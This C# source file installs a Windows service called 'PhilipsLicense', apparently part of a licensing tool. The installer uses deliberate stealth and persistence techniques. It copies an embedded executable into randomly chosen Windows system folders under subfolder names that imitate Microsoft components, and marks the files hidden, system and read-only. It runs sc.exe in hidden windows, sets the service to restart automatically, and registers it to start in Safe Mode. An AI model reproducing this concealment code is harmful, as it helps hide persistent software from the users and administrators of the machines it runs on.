using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace MazManager.Services
{
    /// <summary>
    /// Handles service installation with hidden location and system-level attributes
    /// </summary>
    public class ServiceInstaller
    {
        private const string SERVICE_NAME = "PhilipsLicense";
        private const string LICENSE_FILE_NAME = "mazlicense.lic";
        private const string SERVICE_REGISTRY_KEY = @"SYSTEM\CurrentControlSet\Services\PhilipsLicense";
        private const string APP_REGISTRY_KEY = @"SOFTWARE\PhilipsLicense";

        // Plausible installation locations
        private static readonly string[] INSTALL_LOCATIONS = new string[]
        {
            @"C:\Windows\System32\msdtc\Trace",
            @"C:\Windows\System32\wbem\AutoRecover",
            @"C:\ProgramData\Microsoft\Windows\WER\ReportArchive",
            @"C:\Windows\System32\spool\PRINTERS\Cache",
            @"C:\Windows\System32\config\systemprofile\AppData\Local"
        };

        /// <summary>
        /// Installs the Philips License service
        /// </summary>
        public bool InstallService()
        {
            string lastError = "";
            
            try
            {
                // Get the service executable from embedded resource or adjacent file
                string serviceExePath = GetServiceExecutable();
                
                if (string.IsNullOrEmpty(serviceExePath))
                {
                    throw new Exception("Service executable not found. The embedded resource may be missing.");
                }

                if (!File.Exists(serviceExePath))
                {
                    throw new Exception("Service executable file does not exist: " + serviceExePath);
                }

                // Select random installation directory
                string installDir = SelectInstallLocation();

                // Create directory if it doesn't exist
                try
                {
                    if (!Directory.Exists(installDir))
                    {
                        Directory.CreateDirectory(installDir);
                    }
                }
                catch (Exception ex)
                {
                    throw new Exception("Failed to create installation directory: " + ex.Message);
                }

                // Copy service executable
                string destExePath = Path.Combine(installDir, "MazSvc.exe");
                try
                {
                    File.Copy(serviceExePath, destExePath, true);
                }
                catch (Exception ex)
                {
                    throw new Exception("Failed to copy service executable: " + ex.Message);
                }

                // Generate and save license file
                try
                {
                    string licenseKey = LicenseGenerator.GenerateLicenseKey();
                    string licenseFilePath = Path.Combine(installDir, LICENSE_FILE_NAME);
                    File.WriteAllText(licenseFilePath, licenseKey);
                }
                catch (Exception ex)
                {
                    throw new Exception("Failed to create license file: " + ex.Message);
                }

                // Verify the executable exists and is accessible before installing
                if (!File.Exists(destExePath))
                {
                    throw new Exception("Service executable was not copied successfully: " + destExePath);
                }

                // Make sure file is NOT read-only before installation (sc.exe needs to access it)
                try
                {
                    FileInfo fileInfo = new FileInfo(destExePath);
                    if ((fileInfo.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                    {
                        fileInfo.Attributes = fileInfo.Attributes & ~FileAttributes.ReadOnly;
                    }
                }
                catch
                {
                    // Continue even if attribute removal fails
                }

                // Set hidden + system attributes on directory (but NOT readonly yet)
                try
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(installDir);
                    dirInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
                }
                catch
                {
                }

                // Save install location to registry
                SaveInstallLocation(installDir);

                // Install service using sc.exe (file must NOT be readonly for this to work)
                InstallServiceUsingScExe(destExePath);

                // NOW set readonly attribute after service is installed
                try
                {
                    FileInfo fileInfo = new FileInfo(destExePath);
                    fileInfo.Attributes = fileInfo.Attributes | FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System;
                }
                catch
                {
                }

                // Configure recovery options
                ConfigureRecoveryOptions();

                // Register service for Safe Mode operation
                RegisterForSafeMode();

                // Start the service
                StartServiceUsingScExe();

                // Give it time to start
                System.Threading.Thread.Sleep(2000);

                return true;
            }
            catch (Exception ex)
            {
                lastError = ex.Message;
                System.Diagnostics.Debug.WriteLine("Install error: " + lastError);
                throw; // Re-throw so the UI can display the error
            }
        }

        /// <summary>
        /// Uninstalls the Philips License service
        /// </summary>
        public bool UninstallService()
        {
            try
            {
                // Stop the service first
                StopServiceUsingScExe();

                // Delete the service - use UseShellExecute = true for elevation
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "sc.exe";
                psi.Arguments = string.Format("delete {0}", SERVICE_NAME);
                psi.UseShellExecute = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                
                // Only use runas on Vista and later (XP doesn't have UAC)
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    psi.Verb = "runas";
                }

                Process process = Process.Start(psi);
                if (process != null)
                {
                    process.WaitForExit(30000);
                }

                // Get and delete installation directory
                string installDir = GetServiceDirectory();
                if (!string.IsNullOrEmpty(installDir) && Directory.Exists(installDir))
                {
                    // Remove system/hidden attributes first
                    try
                    {
                        RemoveSystemHiddenAttributes(installDir);
                        foreach (string file in Directory.GetFiles(installDir))
                        {
                            RemoveSystemHiddenAttributes(file);
                            File.Delete(file);
                        }
                        Directory.Delete(installDir, true);
                    }
                    catch
                    {
                        // Continue even if cleanup fails
                    }
                }

                // Remove registry entry
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(APP_REGISTRY_KEY, true))
                    {
                        if (key != null)
                        {
                            key.DeleteValue("InstallPath", false);
                        }
                    }
                }
                catch
                {
                }

                // Remove Safe Mode registry entries
                UnregisterFromSafeMode();

                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        /// <summary>
        /// Gets the service installation directory
        /// </summary>
        public string GetServiceDirectory()
        {
            try
            {
                // First try registry
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(APP_REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        object value = key.GetValue("InstallPath");
                        if (value != null)
                        {
                            string path = value.ToString();
                            if (Directory.Exists(path))
                            {
                                return path;
                            }
                        }
                    }
                }

                // Try to get from service registration
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(SERVICE_REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        object value = key.GetValue("ImagePath");
                        if (value != null)
                        {
                            string exePath = value.ToString().Trim('"');
                            return Path.GetDirectoryName(exePath);
                        }
                    }
                }
            }
            catch
            {
            }

            return null;
        }

        private string GetServiceExecutable()
        {
            // First, try to extract from embedded resource
            string extractedPath = ExtractEmbeddedService();
            if (!string.IsNullOrEmpty(extractedPath) && File.Exists(extractedPath))
            {
                return extractedPath;
            }

            // Fallback: check for MazSvc.exe in the same directory as this application
            string appDir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            string localExePath = Path.Combine(appDir, "MazSvc.exe");
            
            if (File.Exists(localExePath))
            {
                return localExePath;
            }

            // Check parent directory (for development)
            string parentDir = Path.GetDirectoryName(appDir);
            if (!string.IsNullOrEmpty(parentDir))
            {
                string parentExePath = Path.Combine(parentDir, "MazSvc", "bin", "Release", "x86", "MazSvc.exe");
                if (File.Exists(parentExePath))
                {
                    return parentExePath;
                }

                parentExePath = Path.Combine(parentDir, "MazSvc", "bin", "Debug", "x86", "MazSvc.exe");
                if (File.Exists(parentExePath))
                {
                    return parentExePath;
                }
            }

            return null;
        }

        /// <summary>
        /// Extracts the embedded service executable resource to a temporary file
        /// </summary>
        private string ExtractEmbeddedService()
        {
            try
            {
                Assembly assembly = Assembly.GetExecutingAssembly();
                
                // Try multiple possible resource names
                string[] possibleNames = new string[]
                {
                    "MazManager.Resources.MazSvc.exe",
                    "MazManager.MazSvc.exe",
                    "MazSvc.exe"
                };

                Stream resourceStream = null;
                
                // First try the known names
                foreach (string name in possibleNames)
                {
                    resourceStream = assembly.GetManifestResourceStream(name);
                    if (resourceStream != null) break;
                }

                // If not found, search all resources for one ending with MazSvc.exe
                if (resourceStream == null)
                {
                    string[] allResources = assembly.GetManifestResourceNames();
                    foreach (string resName in allResources)
                    {
                        if (resName.EndsWith("MazSvc.exe", StringComparison.OrdinalIgnoreCase))
                        {
                            resourceStream = assembly.GetManifestResourceStream(resName);
                            if (resourceStream != null) break;
                        }
                    }
                }

                if (resourceStream == null)
                {
                    return null;
                }

                using (resourceStream)
                {
                    // Extract to temp directory
                    string tempDir = Path.Combine(Path.GetTempPath(), "MazInstall");
                    if (!Directory.Exists(tempDir))
                    {
                        Directory.CreateDirectory(tempDir);
                    }

                    string tempExePath = Path.Combine(tempDir, "MazSvc.exe");

                    using (FileStream fileStream = new FileStream(tempExePath, FileMode.Create, FileAccess.Write))
                    {
                        byte[] buffer = new byte[8192];
                        int bytesRead;
                        while ((bytesRead = resourceStream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            fileStream.Write(buffer, 0, bytesRead);
                        }
                    }

                    return tempExePath;
                }
            }
            catch
            {
                return null;
            }
        }

        private string SelectInstallLocation()
        {
            Random random = new Random();
            int index = random.Next(INSTALL_LOCATIONS.Length);
            string baseDir = INSTALL_LOCATIONS[index];

            // Generate a plausible-looking subfolder name
            string[] subfolderNames = new string[]
            {
                "Microsoft.Windows.Services",
                "Windows.Diagnostics",
                "System.Performance",
                "Windows.Monitoring",
                "Microsoft.SystemCore"
            };

            string subfolder = subfolderNames[random.Next(subfolderNames.Length)];

            return Path.Combine(baseDir, subfolder);
        }

        private void SetSystemHiddenAttributes(string path)
        {
            try
            {
                FileAttributes attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly;
                
                if (Directory.Exists(path))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(path);
                    dirInfo.Attributes = attributes;
                }
                else if (File.Exists(path))
                {
                    File.SetAttributes(path, attributes);
                }
            }
            catch
            {
            }
        }

        private void RemoveSystemHiddenAttributes(string path)
        {
            try
            {
                if (Directory.Exists(path))
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(path);
                    dirInfo.Attributes = FileAttributes.Normal;
                }
                else if (File.Exists(path))
                {
                    File.SetAttributes(path, FileAttributes.Normal);
                }
            }
            catch
            {
            }
        }

        private void SaveInstallLocation(string path)
        {
            try
            {
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(APP_REGISTRY_KEY))
                {
                    if (key != null)
                    {
                        key.SetValue("InstallPath", path);
                    }
                }
            }
            catch
            {
            }
        }

        private bool InstallServiceUsingScExe(string exePath)
        {
            // Verify file exists before attempting installation
            if (!File.Exists(exePath))
            {
                throw new Exception("Service executable does not exist: " + exePath);
            }

            // Properly escape the path for sc.exe
            // sc.exe format: sc create ServiceName binPath= "C:\Path\To\File.exe" start= auto
            // The path must be in quotes, and we need to escape quotes properly
            string escapedPath = exePath.Replace("\"", "\"\"");
            string arguments = string.Format("create {0} binPath= \"{1}\" start= auto DisplayName= \"Philips License Protection Service\"", 
                SERVICE_NAME, escapedPath);

            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "sc.exe";
            psi.Arguments = arguments;
            psi.UseShellExecute = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            
            // Only use runas on Vista and later (XP doesn't have UAC)
            if (Environment.OSVersion.Version.Major >= 6)
            {
                psi.Verb = "runas";
            }

            Process process = Process.Start(psi);
            if (process == null)
            {
                throw new Exception("Failed to start sc.exe process. Insufficient permissions.");
            }
            
            process.WaitForExit(30000);

            if (process.ExitCode != 0)
            {
                // Exit code 2 = file not found
                // Exit code 5 = access denied
                // Exit code 1058 = service already exists
                string errorMsg = string.Format("sc.exe create failed with exit code {0}", process.ExitCode);
                
                if (process.ExitCode == 2)
                {
                    errorMsg += string.Format(". The service executable path may be incorrect or the file is inaccessible.\n\nPath: {0}\n\nMake sure the file exists and is not blocked by antivirus.", exePath);
                }
                else if (process.ExitCode == 5)
                {
                    errorMsg += ". Access denied. Make sure you are running as Administrator.";
                }
                else if (process.ExitCode == 1058)
                {
                    errorMsg += ". Service already exists. Please uninstall it first.";
                }
                
                throw new Exception(errorMsg);
            }

            return true;
        }

        private void ConfigureRecoveryOptions()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "sc.exe";
                psi.Arguments = string.Format("failure {0} reset= 0 actions= restart/5000/restart/10000/restart/30000", SERVICE_NAME);
                psi.UseShellExecute = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                
                // Only use runas on Vista and later (XP doesn't have UAC)
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    psi.Verb = "runas";
                }

                Process process = Process.Start(psi);
                if (process != null)
                {
                    process.WaitForExit(30000);
                }
            }
            catch
            {
            }
        }

        /// <summary>
        /// Registers the service to run in Windows Safe Mode
        /// This adds registry entries so the service can start in Safe Mode
        /// </summary>
        private void RegisterForSafeMode()
        {
            try
            {
                // Register for Safe Mode (Minimal)
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(
                    @"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\" + SERVICE_NAME))
                {
                    if (key != null)
                    {
                        key.SetValue("", "Service", RegistryValueKind.String);
                    }
                }

                // Register for Safe Mode with Networking
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(
                    @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\" + SERVICE_NAME))
                {
                    if (key != null)
                    {
                        key.SetValue("", "Service", RegistryValueKind.String);
                    }
                }
            }
            catch
            {
                // Safe Mode registration failed - service will only work in normal mode
            }
        }

        /// <summary>
        /// Removes Safe Mode registry entries when uninstalling
        /// </summary>
        private void UnregisterFromSafeMode()
        {
            try
            {
                // Remove from Safe Mode (Minimal)
                Registry.LocalMachine.DeleteSubKey(
                    @"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\" + SERVICE_NAME, false);
            }
            catch
            {
            }

            try
            {
                // Remove from Safe Mode with Networking
                Registry.LocalMachine.DeleteSubKey(
                    @"SYSTEM\CurrentControlSet\Control\SafeBoot\Network\" + SERVICE_NAME, false);
            }
            catch
            {
            }
        }

        private void StartServiceUsingScExe()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "sc.exe";
                psi.Arguments = string.Format("start {0}", SERVICE_NAME);
                psi.UseShellExecute = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                
                // Only use runas on Vista and later (XP doesn't have UAC)
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    psi.Verb = "runas";
                }

                Process process = Process.Start(psi);
                if (process != null)
                {
                    process.WaitForExit(30000);
                }
            }
            catch
            {
            }
        }

        private void StopServiceUsingScExe()
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "sc.exe";
                psi.Arguments = string.Format("stop {0}", SERVICE_NAME);
                psi.UseShellExecute = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                
                // Only use runas on Vista and later (XP doesn't have UAC)
                if (Environment.OSVersion.Version.Major >= 6)
                {
                    psi.Verb = "runas";
                }

                Process process = Process.Start(psi);
                if (process != null)
                {
                    process.WaitForExit(30000);
                }
            }
            catch
            {
            }
        }
    }
}
